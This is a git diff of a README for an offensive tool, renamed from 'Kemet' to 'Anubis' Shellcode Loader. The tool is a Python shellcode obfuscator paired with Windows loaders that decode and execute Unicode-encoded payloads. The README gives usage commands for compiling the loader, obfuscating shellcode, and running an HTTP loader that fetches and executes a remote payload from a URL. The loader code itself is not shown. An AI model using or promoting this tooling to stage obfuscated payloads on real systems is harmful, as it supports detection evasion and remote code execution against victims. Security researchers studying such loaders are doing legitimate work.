@@ -1,10 +1,10 @@
-# 🛡️ Kemet Shellcode Loader
+# 🛡️ Anubis Shellcode Loader
 
-![Kemet Loader Banner](https://github.com/user-attachments/assets/95ba5347-a315-4737-b7be-95313f7650bc)
-<img width="900" height="506" alt="image" src="https://github.com/user-attachments/assets/95ba5347-a315-4737-b7be-95313f7650bc" />
+![Anubis Loader Banner](https://github.com/user-attachments/assets/95ba5347-a315-4737-b7be-95313f7650bc)
 
 
-Kemet Loader is a Unicode‑based shellcode obfuscation and loading framework.  
+
+Anubis Loader is a Unicode‑based shellcode obfuscation and loading framework.  
 It includes both a **Python obfuscator** and **Windows-native loaders** capable of decoding and executing Unicode‑encoded payloads from local files or HTTP sources.
 
 ---
@@ -42,7 +42,7 @@ Uses WinINet to fetch obfuscated Unicode data from a remote server, decode it, a
 
 ### Compile the Windows loader  
 ```bash
-cl kemet_loader.c /link wininet.lib
+cl Anubis_loader.c /link wininet.lib
 ```
 ### Obfuscate shellcode
 ```bash
@@ -51,12 +51,12 @@ python obfuscate.py input.bin -o output.txt
 
 ### Run local loader
 ```bash
-kemet_loader.exe output.txt
+Anubis_loader.exe output.txt
 
 ```
 ### Run HTTP loader
 ```bash
-kemet_http_loader.exe https://example.com/payload.txt
+Anubis_http_loader.exe https://example.com/payload.txt
 ```
 ----
 
